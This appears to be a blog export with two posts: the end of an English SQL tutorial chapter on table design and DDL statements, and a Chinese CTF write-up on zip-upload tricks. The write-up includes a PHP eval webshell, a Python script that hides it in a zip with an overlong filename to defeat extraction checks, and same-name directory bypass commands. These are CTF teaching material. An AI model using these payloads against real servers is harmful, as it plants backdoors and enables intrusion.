<p><strong>NOTE:</strong> Again, be sure to consult your database management system’s documentation to learn the specifics of building a database, as the <strong>CREATE DATABASE</strong> statement can and does vary for the different implementations. Each implementation also has some unique options.</p>
<p><strong>Database Design</strong></p>
<p><em>Normalization</em> is the process of breaking your data into separate components to reduce the repetition of data. Each level of normalization reduces the repetition of data. Normalizing your data can be an extremely complex process, and numerous database design tools enable you to plan this process in a logical fashion. Many factors can influence the design of your database, including the following:</p>
<p><strong>Security</strong></p>
<ul>
<li>Disk space available</li>
<li>Speed of database searches and retrievals</li>
<li>Speed of database updates</li>
<li>Speed of multiple-table joins to retrieve data</li>
<li>RDBMS support for temporary tables</li>
</ul>
<p>Disk space is always an important factor. Although you may not think that disk space is a major concern in an age of multigigabyte storage, remember that the bigger your database is, the longer it takes to retrieve records. If you have done a poor job of designing your table structure, chances are that you have needlessly repeated much of your data.</p>
<p>Often the opposite problem can occur. You may have sought to completely normalize your tables’ design with the database and in doing so created many tables. Although you may have approached database-design nirvana, any query operations done against this database may take a very long time to execute. Databases designed in this manner are sometimes difficult to maintain because the table structure might obscure the designer’s intent. This problem underlines the importance of always documenting your code or design so that others can come in after you (or work with you) and have some idea of what you were thinking at the time you created your database structure. In database designer’s terms, this documentation is known as a data dictionary.</p>
<h2 id="creating-a-data-dictionary"><a class="markdownIt-Anchor" href="#creating-a-data-dictionary"></a> <strong>Creating a Data Dictionary</strong></h2>
<p>A data dictionary is the database designer’s most important form of documentation. It performs the following functions:</p>
<ul>
<li>Describes the purpose of the database and who will be using it.</li>
<li>Documents the specifics behind the database itself: what device it was created on, the database’s default size, or the size of the log file (used to store database operations information in some RDBMSs).</li>
<li>Contains SQL source code for any database install or uninstall scripts, including documentation on the use of import/export tools.</li>
<li>Provides a detailed description of each table within the database and explains its purpose in business process terminology.</li>
<li>Documents the internal structure of each table, including all fields and their data types with comments, all indexes, and all views.</li>
<li>Contains SQL source code for all stored procedures and triggers.</li>
<li>Describes database constraints such as the use of unique values or <strong>NOT NULL</strong> values. The documentation should also mention whether these constraints are enforced at the RDBMS level or whether the database programmer is expected to check for these constraints within the source code.</li>
</ul>
<p>Many computer-aided software engineering (CASE) tools aid the database designer in the creation of this data dictionary. For instance, Microsoft Access comes prepackaged with a database documenting tool that prints out a detailed description of every object in the database.</p>
<p><strong>NOTE:</strong> Most of the major RDBMS packages come with either the data dictionary installed or scripts to install it.</p>
<h2 id="creating-key-fields"><a class="markdownIt-Anchor" href="#creating-key-fields"></a> <strong>Creating Key Fields</strong></h2>
<p>Along with documenting your database design, the most important design goal you should have is to create your table structure so that each table has a primary key and a foreign key. The primary key should meet the following goals:</p>
<ul>
<li>Each record is unique within a table (no other record within the table has all of its columns equal to any other).</li>
<li>For a record to be unique, all the columns are necessary; that is, data in one column should not be repeated anywhere else in the table.</li>
</ul>
<p>Regarding the second goal, the column that has completely unique data throughout the table is known as the <em>primary key field</em>. A <em>foreign key field</em> is a field that links one table to another table’s primary or foreign key. The following example should clarify this situation.</p>
<p>Assume you have three tables: <strong>BILLS</strong>, <strong>BANK_ACCOUNTS</strong>, and <strong>COMPANY</strong>. Table 9.1 shows the format of these three tables.</p>
<p><strong>Table 9.1. Table structure for the PAYMENTS database.</strong></p>
<p><img src="https://img-blog.csdnimg.cn/54613e7278674249b4a08a642a66837b.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>Take a moment to examine these tables. Which fields do you think are the primary keys? Which are the foreign keys?</p>
<p>The primary key in the <strong>BILLS</strong> table is the <strong>NAME</strong> field. This field should not be duplicated because you have only one bill with this amount. (In reality, you would probably have a check number or a date to make this record truly unique, but assume for now that the <strong>NAME</strong> field works.) The <strong>ACCOUNT_ID</strong> field in the <strong>BANK_ACCOUNTS</strong> table is the primary key for that table. The <strong>NAME</strong> field is the primary key for the <strong>COMPANY</strong> table.</p>
<p>The foreign keys in this example are probably easy to spot. The <strong>ACCOUNT_ID</strong> field in the <strong>BILLS</strong> table joins the <strong>BILLS</strong> table with the <strong>BANK_ACCOUNTS</strong> table. The <strong>NAME</strong> field in the <strong>BILLS</strong> table joins the <strong>BILLS</strong> table with the <strong>COMPANY</strong> table. If this were a full-fledged database design, you would have many more tables and data breakdowns. For instance, the <strong>BANK</strong> field in the <strong>BANK_ACCOUNTS</strong> table could point to a <strong>BANK</strong> table containing bank information such as addresses and phone numbers. The <strong>COMPANY</strong> table could be linked with another table (or database for that matter) containing information about the company and its products.</p>
<p><strong>Exercise 9.1</strong></p>
<p>Let’s take a moment to examine an incorrect database design using the same information contained in the <strong>BILLS</strong>, <strong>BANK_ACCOUNTS</strong>, and <strong>COMPANY</strong> tables. A mistake many beginning users make is not breaking down their data into as many logical groups as possible. For instance, one poorly designed <strong>BILLS</strong> table might look like this:</p>
<p><img src="https://img-blog.csdnimg.cn/75dd3c28420b4db7af3b8291bcf7bb97.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/7047a6fada8f4a6ba3ea2083f2961ea8.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>The results may look correct, but take a moment to really look at the data here. If over several months you wrote several bills to the company in the <strong>NAME</strong> field, each time a new record was added for a bill, the company’s <strong>ADDRESS</strong>, <strong>CITY</strong>, and <strong>STATE</strong> information would be duplicated. Now multiply that duplication over several hundred or thousand records and then multiply that figure by 10, 20, or 30 tables. You can begin to see the importance of a properly normalized database.</p>
<p>Before you actually fill these tables with data, you will need to know how to create a table.</p>
<h2 id="the-create-table-statement"><a class="markdownIt-Anchor" href="#the-create-table-statement"></a> <strong>The CREATE TABLE Statement</strong></h2>
<p>The process of creating a table is far more standardized than the <strong>CREATE DATABASE</strong> statement. Here’s the basic syntax for the <strong>CREATE TABLE</strong> statement:</p>
<p><strong>SYNTAX:</strong></p>
<p>CREATE TABLE table_name</p>
<p>( field1 datatype [ NOT NULL ],</p>
<p>field2 datatype [ NOT NULL ],</p>
<p>field3 datatype [ NOT NULL ]…)</p>
<p>A simple example of a <strong>CREATE TABLE</strong> statement follows</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>CREATE TABLE BILLS (</strong></p>
<p>2 <strong>NAME CHAR(30),</strong></p>
<p>3 <strong>AMOUNT NUMBER,</strong></p>
<p>4 <strong>ACCOUNT_ID NUMBER);</strong></p>
<p>Table created.</p>
<p><strong>ANALYSIS:</strong></p>
<p>This statement creates a table named <strong>BILLS</strong>. Within the <strong>BILLS</strong> table are three fields: <strong>NAME</strong>, <strong>AMOUNT</strong>, and <strong>ACCOUNT_ID</strong>. The <strong>NAME</strong> field has a data type of character and can store strings up to 30 characters long. The <strong>AMOUNT</strong> and <strong>ACCOUNT_ID</strong> fields can contain number values only.</p>
<p>The following section examines components of the <strong>CREATE TABLE</strong> command.</p>
<h3 id="the-table-name"><a class="markdownIt-Anchor" href="#the-table-name"></a> <strong>The Table Name</strong></h3>
<p>When creating a table using Personal Oracle7, several constraints apply when naming the table. First, the table name can be no more than 30 characters long. Because Oracle is case insensitive, you can use either uppercase or lowercase for the individual characters. However, the first character of the name must be a letter between <strong>A</strong> and <strong>Z</strong>. The remaining characters can be letters or the symbols <strong>_</strong>, <strong>#</strong>, <strong>$</strong>, and <strong>@</strong>. Of course, the table name must be unique within its schema. The name also cannot be one of the Oracle or SQL reserved words (such as <strong>SELECT</strong>).</p>
<p><strong>NOTE:</strong> You can have duplicate table names as long as the owner or schema is different. Table names in the same schema must be unique.</p>
<h3 id="the-field-name"><a class="markdownIt-Anchor" href="#the-field-name"></a> <strong>The Field Name</strong></h3>
<p>The same constraints that apply to the table name also apply to the field name. However, a field name can be duplicated within the database. The restriction is that the field name must be unique within its table. For instance, assume that you have two tables in your database: <strong>TABLE1</strong>and <strong>TABLE2</strong>. Both of these tables could have fields called ID. You cannot, however, have two fields within <strong>TABLE1</strong> called <strong>ID</strong>, even if they are of different data types.</p>
<h3 id="the-fields-data-type"><a class="markdownIt-Anchor" href="#the-fields-data-type"></a> <strong>The Field’s Data Type</strong></h3>
<p>If you have ever programmed in any language, you are familiar with the concept of data types, or the type of data that is to be stored in a specific field. For instance, a character data type constitutes a field that stores only character string data. Table 9.2 shows the data types supported by Personal Oracle7.</p>
<p><strong>Table 9.2. Data types supported by Personal Oracle7.</strong></p>
<p><img src="https://img-blog.csdnimg.cn/96c27bf2f8294ddd95fdbb552a7c9071.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/97d769dab67f44fba0b88e7a2f110dd1.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><strong>NOTE:</strong> The <strong>LONG</strong> data type is often called a <strong>MEMO</strong> data type in other database management systems. It is primarily used to store large amounts of text for retrieval at some later time.</p>
<p>The <strong>LONG RAW</strong> data type is often called a binary large object (<strong>BLOB</strong>) in other database management systems. It is typically used to store graphics, sound, or video data. Although relational database management systems were not originally designed to serve this type of data, many multimedia systems today store their data in <strong>LONG RAW</strong>, or <strong>BLOB</strong>, fields.</p>
<p>The <strong>ROWID</strong> field type is used to give each record within your table a unique, no duplicating value. Many other database systems support this concept with a <strong>COUNTER</strong> field (Microsoft Access) or an <strong>IDENTITY</strong> field (SQL Server).</p>
<p><strong>NOTE:</strong> Check your implementation for supported data types as they may vary.</p>
<h3 id="the-null-value"><a class="markdownIt-Anchor" href="#the-null-value"></a> <strong>The NULL Value</strong></h3>
<p>SQL also enables you to identify what can be stored within a column. A <strong>NULL</strong> value is almost an oxymoron, because having a field with a value of <strong>NULL</strong> means that the field actually has no value stored in it.</p>
<p>When building a table, most database systems enable you to denote a column with the <strong>NOT NULL</strong> keywords. <strong>NOT NULL</strong> means the column cannot contain any <strong>NULL</strong> values for any records in the table. Conversely, <strong>NOT NULL</strong> means that every record must have an actual value in this column. The following example illustrates the use of the <strong>NOT NULL</strong> keywords.</p>
<p><strong>INPUT:</strong></p>
<p>SQL&gt; <strong>CREATE TABLE BILLS (</strong></p>
<p>2 <strong>NAME CHAR(30) NOT NULL,</strong></p>
<p>3 <strong>AMOUNT NUMBER,</strong></p>
<p>4 <strong>ACCOUNT_ID NOT NULL);</strong></p>
<p><strong>ANALYSIS:</strong></p>
<p>In this table you want to save the name of the company you owe the money to, along with the bill’s amount. If the <strong>NAME</strong> field and/or the <strong>ACCOUNT_ID</strong> were not stored, the record would be meaningless. You would end up with a record with a bill, but you would have no idea whom you should pay.</p>
<p>The first statement in the next example inserts a valid record containing data for a bill to be sent to Joe’s Computer Service for $25.</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>INSERT INTO BILLS VALUES(“Joe’s Computer Service”, 25, 1);</strong></p>
<p>1 row inserted.</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>INSERT INTO BILLS VALUES(“”, 25000, 1);</strong></p>
<p>1 row inserted.</p>
<p><strong>ANALYSIS:</strong></p>
<p>Notice that the second record in the preceding example does not contain a <strong>NAME</strong> value. (You might think that a missing payee is to your advantage because the bill amount is $25,000, but we won’t consider that.) If the table had been created with a <strong>NOT NULL</strong> value for the <strong>NAME</strong> field, the second insert would have raised an error.</p>
<p>A good rule of thumb is that the primary key field and all foreign key fields should never contain <strong>NULL</strong> values.</p>
<p><strong>Unique Fields</strong></p>
<p>One of your design goals should be to have one unique column within each table. This column or field is a primary key field. Some database management systems allow you to set a field as unique. Other database management systems, such as Oracle and SQL Server, allow you to create a unique index on a field. This feature keeps you from inserting duplicate key field values into the database.</p>
<p>You should notice several things when choosing a key field. As we mentioned, Oracle provides a <strong>ROWID</strong> field that is incremented for each row that is added, which makes this field by default always a unique key. <strong>ROWID</strong> fields make excellent key fields for several reasons. First, it is much faster to join on an integer value than on an 80- character string. Such joins result in smaller database sizes over time if you store an integer value in every primary and foreign key as opposed to a long <strong>CHAR</strong> value. Another advantage is that you can use <strong>ROWID</strong> fields to see how a table is organized. Also, using <strong>CHAR</strong> values leaves you open to a number of data entry problems. For instance, what would happen if one person entered <strong>111 First Street</strong>, another entered <strong>111 1st Street</strong>, and yet another entered <strong>111 First St.</strong>? With today’s graphical user environments, the correct string could be entered into a list box. When a user makes a selection from the list box, the code would convert this string to a unique ID and save this ID to the database.</p>
<p>Now you can create the tables you used earlier today. You will use these tables for the rest of today, so you will want to fill them with some data. Use the <strong>INSERT</strong> command covered yesterday to load the tables with the data in Tables 9.3, 9.4, and 9.5.</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>create database PAYMENTS;</strong></p>
<p>Statement processed.</p>
<p>SQL&gt; <strong>create table BILLS (</strong></p>
<p>2 <strong>NAME CHAR(30) NOT NULL,</strong></p>
<p>3 <strong>AMOUNT NUMBER,</strong></p>
<p>4 <strong>ACCOUNT_ID NUMBER NOT NULL);</strong></p>
<p>Table created.</p>
<p>SQL&gt; <strong>create table BANK_ACCOUNTS (</strong></p>
<p>2 <strong>ACCOUNT_ID NUMBER NOT NULL,</strong></p>
<p>3 <strong>TYPE CHAR(30),</strong></p>
<p>4 <strong>BALANCE NUMBER,</strong></p>
<p>5 <strong>BANK CHAR(30));</strong></p>
<p>Table created.</p>
<p>SQL&gt; <strong>create table COMPANY (</strong></p>
<p>2 <strong>NAME CHAR(30) NOT NULL,</strong></p>
<p>3 <strong>ADDRESS CHAR(50),</strong></p>
<p>4 <strong>CITY CHAR(30),</strong></p>
<p>5 <strong>STATE CHAR(2));</strong></p>
<p>Table created.</p>
<p><strong>Table 9.3. Sample data for the BILLS table.</strong></p>
<p><img src="https://img-blog.csdnimg.cn/0d2c47a1014d4410b1914a93640728cc.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><strong>Table 9.4. Sample data for the BANK_ACCOUNTS table.</strong></p>
<p><img src="https://img-blog.csdnimg.cn/0e80211dce534627935aeb2437501c74.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><strong>Table 9.5. Sample data for the COMPANY table.</strong></p>
<p><img src="https://img-blog.csdnimg.cn/458ba3ffdf17401ba0fed78e6c46207f.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><strong>Table Storage and Sizing</strong></p>
<p>Most major RDBMSs have default settings for table sizes and table locations. If you do not specify table size and location, then the table will take the defaults. The defaults may be very undesirable, especially for large tables. The default sizes and locations will vary among the implementations. Here is an example of a <strong>CREATE TABLE</strong> statement with a storage clause (from Oracle).</p>
<p><strong>INPUT:</strong></p>
<p>SQL&gt; <strong>CREATE TABLE TABLENAME</strong></p>
<p>2 <strong>(COLUMN1 CHAR NOT NULL,</strong></p>
<p>3 <strong>COLUMN2 NUMBER,</strong></p>
<p>4 <strong>COLUMN3 DATE)</strong></p>
<p>5 <strong>TABLESPACE TABLESPACE NAME</strong></p>
<p>6 <strong>STORAGE</strong></p>
<p>7 <strong>INITIAL SIZE,</strong></p>
<p>8 <strong>NEXT SIZE,</strong></p>
<p>9 <strong>MINEXTENTS value,</strong></p>
<p>10 <strong>MAXEXTENTS value,</strong></p>
<p>11 <strong>PCTINCREASE value);</strong></p>
<p><strong>OUTPUT:</strong></p>
<p>Table created.</p>
<p><strong>ANALYSIS:</strong></p>
<p>In Oracle you can specify a tablespace in which you want the table to reside. A decision is usually made according to the space available, often by the database administrator (DBA). <strong>INITIAL SIZE</strong> is the size for the initial extent of the table (the initial allocated space). <strong>NEXT SIZE</strong> is the value for any additional extents the table may take through growth. <strong>MINEXTENTS</strong> and <strong>MAXEXTENTS</strong> identify the minimum and maximum extents allowed for the table, and <strong>PCTINCREASE</strong> identifies the percentage the next extent will be increased each time the table grows, or takes another extent.</p>
<p><strong>Creating a Table from an Existing Table</strong></p>
<p>The most common way to create a table is with the <strong>CREATE TABLE</strong> command. However, some database management systems provide an alternative method of creating tables, using the format and data of an existing table. This method is useful when you want to select the data out of a table for temporary modification. It can also be useful when you have to create a table similar to the existing table and fill it with similar data. (You won’t have to reenter all this information.) The syntax for Oracle follows.</p>
<p><strong>SYNTAX:</strong></p>
<p>CREATE TABLE NEW_TABLE(FIELD1, FIELD2, FIELD3)</p>
<p>AS (SELECT FIELD1, FIELD2, FIELD3</p>
<p>FROM OLD_TABLE &lt;WHERE…&gt;</p>
<p>This syntax allows you to create a new table with the same data types as those of the fields that are selected from the old table. It also allows you to rename the fields in the new table by giving them new names.</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>CREATE TABLE NEW_BILLS(NAME, AMOUNT, ACCOUNT_ID)</strong></p>
<p>2 <strong>AS (SELECT * FROM BILLS WHERE AMOUNT &lt; 50);</strong></p>
<p>Table created.</p>
<p><strong>ANALYSIS:</strong></p>
<p>The preceding statement creates a new table (<strong>NEW_BILLS</strong>) with all the records from the <strong>BILLS</strong> table that have an <strong>AMOUNT</strong> less than <strong>50</strong>.</p>
<p>Some database systems also allow you to use the following syntax:</p>
<p><strong>SYNTAX:</strong></p>
<p>INSERT NEW_TABLE</p>
<p>SELECT &lt;field1, field2… | *&gt; from OLD_TABLE</p>
<p>&lt;WHERE…&gt;</p>
<p>The preceding syntax would create a new table with the exact field structure and data found in the old table. Using SQL Server’s Transact-SQL language in the following example illustrates this technique.</p>
<p><strong>INPUT:</strong></p>
<p><strong>INSERT NEW_BILLS</strong></p>
<p>1&gt; <strong>select * from BILLS where AMOUNT &lt; 50</strong></p>
<p>2&gt; <strong>go</strong></p>
<p>(The <strong>GO</strong> statement in SQL Server processes the SQL statements in the command buffer. It is equivalent to the semicolon (<strong>;</strong>) used in Oracle7.)</p>
<p><strong>The ALTER TABLE Statement</strong></p>
<p>Many times your database design does not account for everything it should. Also, requirements for applications and databases are always subject to change. The <strong>ALTER TABLE</strong> statement enables the database administrator or designer to change the structure of a table after it has been created.</p>
<p>The <strong>ALTER TABLE</strong> command enables you to do two things:</p>
<ul>
<li>Add a column to an existing table</li>
<li>Modify a column that already exists</li>
</ul>
<p>The syntax for the <strong>ALTER TABLE</strong> statement is as follows:</p>
<p><strong>SYNTAX:</strong></p>
<p>ALTER TABLE table_name</p>
<p>&lt;ADD column_name data_type; |</p>
<p>MODIFY column_name data_type;&gt;</p>
<p>The following command changes the <strong>NAME</strong> field of the <strong>BILLS</strong> table to hold 40</p>
<p>characters:</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>ALTER TABLE BILLS</strong></p>
<p>2 <strong>MODIFY NAME CHAR(40);</strong></p>
<p>Table altered.</p>
<p><strong>NOTE:</strong> You can increase or decrease the length of columns; however, you can not decrease a column’s length if the current size of one of its values is greater than the value you want to assign to the column length.</p>
<p>Here’s a statement to add a new column to the <strong>NEW_BILLS</strong> table:</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>ALTER TABLE NEW_BILLS</strong></p>
<p>2 <strong>ADD COMMENTS CHAR(80);</strong></p>
<p>Table altered.</p>
<p><strong>ANALYSIS:</strong></p>
<p>This statement would add a new column named <strong>COMMENTS</strong> capable of holding 80 characters. The field would be added to the right of all the existing fields.</p>
<p>Several restrictions apply to using the <strong>ALTER TABLE</strong> statement. You cannot use it to add or delete fields from a database. It can change a column from <strong>NOT NULL</strong> to <strong>NULL</strong>, but not necessarily the other way around. A column specification can be changed from <strong>NULL</strong> to <strong>NOT NULL</strong> only if the column does not contain any <strong>NULL</strong> values. To change a column from <strong>NOT NULL</strong> to <strong>NULL</strong>, use the following syntax:</p>
<p><strong>SYNTAX:</strong></p>
<p>ALTER TABLE table_name MODIFY (column_name data_type NULL);</p>
<p>To change a column from <strong>NULL</strong> to <strong>NOT NULL</strong>, you might have to take several steps:</p>
<p><strong>1.</strong> Determine whether the column has any <strong>NULL</strong> values.</p>
<p><strong>2.</strong> Deal with any <strong>NULL</strong> values that you find. (Delete those records; update the column’s value, and so on.)</p>
<p><strong>3.</strong> Issue the <strong>ALTER TABLE</strong> command.</p>
<p><strong>NOTE:</strong> Some database management systems allow the use of the <strong>MODIFY</strong> Clause; others do not. Still others have added other clauses to the <strong>ALTER TABLE</strong> statement. In Oracle, you can even alter the table’s storage parameters. Check the documentation of the system you are using to determine the implementation of the <strong>ALTER TABLE</strong> statement.</p>
<p><strong>The DROP TABLE Statement</strong></p>
<p>SQL provides a command to completely remove a table from a database. The <strong>DROP TABLE</strong> command deletes a table along with all its associated views and indexes. After this command has been issued, there is no turning back. The most common use of the <strong>DROP TABLE</strong> statement is when you have created a table for temporary use. When you have completed all operations on the table that you planned to do, issue the <strong>DROP TABLE</strong> statement with the following syntax:</p>
<p><strong>SYNTAX:</strong></p>
<p>DROP TABLE table_name;</p>
<p>Here’s how to drop the <strong>NEW_BILLS</strong> table:</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>DROP TABLE NEW_BILLS;</strong></p>
<p>Table dropped.</p>
<p><strong>ANALYSIS:</strong></p>
<p>Notice the absence of system prompts. This command did not ask <strong>Are you sure? (Y/N)</strong>. After the <strong>DROP TABLE</strong> command is issued, the table is permanently deleted.</p>
<p><strong>WARNING:</strong> If you issue</p>
<p>SQL&gt; DROP TABLE NEW_BILLS;</p>
<p>you could be dropping the incorrect table. When dropping tables, you should always use the owner or schema name. The recommended syntax is</p>
<p>SQL&gt; DROP TABLE OWNER.NEW_BILLS;</p>
<p>We are stressing this syntax because we once had to repair a production database from which the wrong table had been dropped. The table was not properly identified with the schema name. Restoring the database was an eight-hour job, and we had to work until well past midnight.</p>
<p><strong>The DROP DATABASE Statement</strong></p>
<p>Some database management systems also provide the <strong>DROP DATABASE</strong> statement, which is identical in usage to the <strong>DROP TABLE</strong> statement. The syntax for this statement is as follows:</p>
<p>DROP DATABASE database_name</p>
<p><strong>NOTE:</strong> The various relational database implementations require you to take different steps to drop a database. After the database is dropped, you will need to clean up the operating system files that compose the database.</p>
<p><strong>Exercise 9.2</strong></p>
<p>Create a database with one table in it. Issue the <strong>DROP TABLE</strong> command and the issue the <strong>DROP DATABASE</strong> command. Does your database system allow you to do this? Single-file based systems, such as Microsoft Access, do not support this command. The database is contained in a single file. To create a database, you must use the menu options provided in the product itself. To delete a database, simply delete the file from the hard drive.</p>
<p><strong>Summary</strong></p>
<p>It covers the major features of SQL’s Data Manipulation Language (DML). In particular, you learned five new statements: <strong>CREATE DATABASE</strong>, <strong>CREATE TABLE</strong>, <strong>ALTER TABLE</strong>, <strong>DROP TABLE</strong>, and <strong>DROP DATABASE</strong>. It also discusses the importance of creating a good database design.</p>
<p>A data dictionary is one of the most important pieces of documentation you can create when designing a database. This dictionary should include a complete description of all objects in the database: tables, fields, views, indexes, stored procedures, triggers, and so forth. A complete data dictionary also contains a brief comment explaining the purpose behind each item in the database. You should update the data dictionary whenever you make changes to the database.</p>
<p>Before using any of the data manipulation statements, it is also important to create a good database design. Break down the required information into logical groups and try to identify a primary key field that other groups (or tables) can use to reference this logical group. Use foreign key fields to point to the primary or foreign key fields in other tables.</p>
<p>You learned that the <strong>CREATE DATABASE</strong> statement is not a standard element within database systems. This variation is primarily due to the many different ways vendors store their databases on disk. Each implementation enables a different set of features and options, which results in a completely different <strong>CREATE DATABASE</strong> statement. Simply issuing <strong>CREATE DATABASE database_name</strong> creates a default database with a default size on most systems. The <strong>DROP DATABASE</strong> statement permanently removes that database.</p>
<p>The <strong>CREATE TABLE</strong> statement creates a new table. With this command, you can create the fields you need and identify their data types. Some database management systems also allow you to specify other attributes for the field, such as whether it can allow <strong>NULL</strong> values or whether that field should be unique throughout the table. The <strong>ALTER TABLE</strong> statement can alter the structure of an existing table. The <strong>DROP TABLE</strong> statement can delete a table from a database.</p>
<p><strong>Q&amp;A</strong></p>
<p><strong>Q Why does the</strong> <strong>CREATE DATABASE</strong> <strong>statement vary so much from one system to another?</strong></p>
<p><strong>A</strong> <strong>CREATE DATABASE</strong> varies because the actual process of creating a database varies from one database system to another. Small PC-based databases usually rely on files that are created within some type of application program. To distribute the database on a large server, related database files are simply distributed over several disk drives. When your code accesses these databases, there is no database process running on the computer, just your application accessing the files directly. More powerful database systems must take into account disk space management as well as support features such as security, transaction control, and stored procedures embedded within the database itself. When your application program accesses a database, a database server manages your requests (along with many others’ requests) and returns data to you through a sometimes complex layer of middleware.</p>
<p><strong>Q Can I create a table temporarily and then automatically drop it when I am done with it?</strong></p>
<p><strong>A</strong> Yes. Many database management systems support the concept of a temporary table. This type of table is created for temporary usage and is automatically deleted when your user’s process ends or when you issue the <strong>DROP TABLE</strong> command.</p>
<p><strong>Q Can I remove columns with the</strong> <strong>ALTER TABLE</strong> <strong>statement?</strong></p>
<p><strong>A</strong> No. The <strong>ALTER TABLE</strong> command can be used only to add or modify columns within a table. To remove columns, create a new table with the desired format and then select the records from the old table into the new table.</p>
]]></content>
      <categories>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF中zip文件的使用</title>
    <url>/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>这是一场招新赛中的一个赛题做的总结，大佬们锤轻点QwQ</p>
<span id="more"></span>
<h1 id="ctf中zip文件的使用"><a class="markdownIt-Anchor" href="#ctf中zip文件的使用"></a> CTF中zip文件的使用</h1>
<p>在CTF中zip文件的出现频率很高，大多出现在Misc和Crypto赛道以加密和修复的姿势出现，但本文主要讲解的是在Web赛道上zip文件的一下利用方式。</p>
<h2 id="利用姿势onezip报错解压"><a class="markdownIt-Anchor" href="#利用姿势onezip报错解压"></a> 利用姿势ONE—zip报错解压</h2>
<p>利用条件：只能上传压缩包，且压缩包内的图片会保留，其他都会删除，对目录穿越做了限制； 只能从解压方面入手。</p>
<h3 id="文件名报错"><a class="markdownIt-Anchor" href="#文件名报错"></a> 文件名/报错</h3>
<p>在PHP架构中，有一个自带的解压函数ZipArchive。这里的报错解压就是使ZipArchive识别文件出错，但是能够正常保留压缩包中的文件。例如在windows下不允许文件中包含</p>
<p>冒号(😃，我们就可以在010editor中修改压缩文件的deFileName属性的值，此时解压就会出错，但是一句话代码就会保留下来。在Linux下也有类似的方法，可以将文件名改成5个斜杠(/////)，此时Linux写解压也会出错，但是一句话木马被保留下来了。</p>
<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106143638292.png" alt="image-20221106143638292"></p>
<h3 id="超长文件名报错伴随一句话木马"><a class="markdownIt-Anchor" href="#超长文件名报错伴随一句话木马"></a> 超长文件名报错伴随一句话木马</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">mf = io.BytesIO()</span><br><span class="line"><span class="keyword">with</span> zipfile.ZipFile(mf, mode=<span class="string">&quot;w&quot;</span>, compression=zipfile.ZIP_STORED) <span class="keyword">as</span> zf:</span><br><span class="line">    zf.writestr(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">b&#x27;@&lt;?php eval($_POST[TW])?&gt;&#x27;</span>)</span><br><span class="line">    zf.writestr(<span class="string">&#x27;A&#x27;</span> * <span class="number">5000</span>, <span class="string">b&#x27;AAAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;shell.zip&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(mf.getvalue())</span><br></pre></td></tr></table></figure>
<h2 id="利用姿势two同名解压"><a class="markdownIt-Anchor" href="#利用姿势two同名解压"></a> 利用姿势Two–同名解压</h2>
<h3 id="压缩包中目录名和一个文件名相同"><a class="markdownIt-Anchor" href="#压缩包中目录名和一个文件名相同"></a> 压缩包中目录名和一个文件名相同</h3>
<p>首先创建一个shell.php，内包含一句话木马，先把压缩进压缩包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip -y test1.zip shell.php</span><br></pre></td></tr></table></figure>
<p>然后删除shell.php创建一个同名文件夹，里面随便放一些东西，再压缩进同一个压缩包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir shell.php</span><br><span class="line">zip -y test1.zip shell.php/1.txt</span><br></pre></td></tr></table></figure>
<h3 id="创建0文件夹绕过"><a class="markdownIt-Anchor" href="#创建0文件夹绕过"></a> 创建“0”文件夹绕过</h3>
<p><img src="/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/image-20221106145439629.png" alt="image-20221106145439629"></p>
<p>这里的read()函数不会处理0文件夹，所以这里的array返回值为空。</p>
